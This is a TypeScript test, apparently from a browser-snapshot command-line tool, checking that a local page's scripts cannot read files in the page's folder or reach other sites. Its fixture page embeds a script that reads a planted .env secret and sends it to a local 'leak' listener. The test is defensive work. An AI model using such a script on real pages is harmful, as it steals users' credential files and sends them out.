/**
 * `swarmloom snapshot` of a local HTML file against a real browser, with the test double of the snapshot
 * script. Skipped (with the reason) when the machine has no Chrome.
 */

import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { snapshotCommand } from "../src/commands/snapshot";
import { findBrowser } from "../src/discovery/browser";
import { systemHost } from "../src/discovery/host";

const SNAPSHOT_DOUBLE = path.join(import.meta.dirname, "fixtures/snapshot.js");
const chrome = (() => {
  try {
    return findBrowser(systemHost()).path;
  } catch {
    return undefined;
  }
})();

describe.skipIf(!chrome)(`snapshot of a local file${chrome ? "" : " (skipped: no Chrome/Chromium found)"}`, () => {
  it("keeps the page's scripts and requests away from the folder and other sites", async () => {
    const hits: string[] = [];
    const listener = createServer((req, res) => {
      hits.push(req.url ?? "");
      res.end();
    });
    await new Promise<void>((resolve) => listener.listen(0, "127.0.0.1", resolve));
    const leak = `http://127.0.0.1:${(listener.address() as AddressInfo).port}/leak`;
    const dir = await mkdtemp(path.join(tmpdir(), "swarmloom-snapshot-"));
    try {
      await writeFile(path.join(dir, ".env"), "API_KEY=topsecret");
      await writeFile(
        path.join(dir, "page.html"),
        `<!doctype html><title>t</title><p id="out">static text</p><img src="${leak}?img">
<script>fetch(".env").then((r) => r.text()).then((t) => {
  document.getElementById("out").textContent = "READ " + t;
  fetch("${leak}?d=" + encodeURIComponent(t), { mode: "no-cors" });
});</script>`,
      );
      const out: string[] = [];
      const io = { out: (line: string) => out.push(line), err: () => {} };
      const argv = [path.join(dir, "page.html"), "-o", "-", "--chrome", chrome as string, "--quiet"];
      const code = await snapshotCommand.run(argv, {
        io,
        cwd: dir,
        env: {},
        assets: { snapshotBundle: SNAPSHOT_DOUBLE },
      });
      expect(code).toBe(0);
      const json = out.join("\n");
      expect(json).toContain("static text");
      expect(json).not.toContain("topsecret");
      expect(hits).toEqual([]);
    } finally {
      listener.close();
      await rm(dir, { recursive: true, force: true });
    }
  }, 120_000);
});
